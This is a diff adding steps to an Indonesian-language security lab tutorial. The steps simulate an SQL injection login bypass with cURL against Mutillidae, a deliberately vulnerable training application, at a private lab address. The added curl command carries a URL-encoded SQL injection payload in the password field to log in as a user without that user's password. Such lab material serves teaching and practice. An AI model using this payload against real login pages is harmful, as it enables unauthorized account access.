@@ -122,7 +122,19 @@ Lesson 6
 - **Step 10**    : Logout dan tutup Mozilla Firefox
 
 ### Section 14: Simulate cURL SQL Injection: (Obtain Access #2)
-
+- **Step 1**    : Buka Terminal
+- **Step 2**    : Hapus file crack_cookies.txt
+    ```
+    rm crack_cookies.txt
+    ```
+- **Step 3**    : Gunakan **POST** Data dari burp2.txt
+    ```
+    grep -i username burp2.txt
+    ```
+- **Step 4**    : Lakukan Autentikasi menggunakan Curl
+    ```
+    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29--+&login-php-submit-button=Login" --location "http://10.151.36.64/mutillidae/index.php?page=login.php" > login2.txt
+    ```
     
 
 
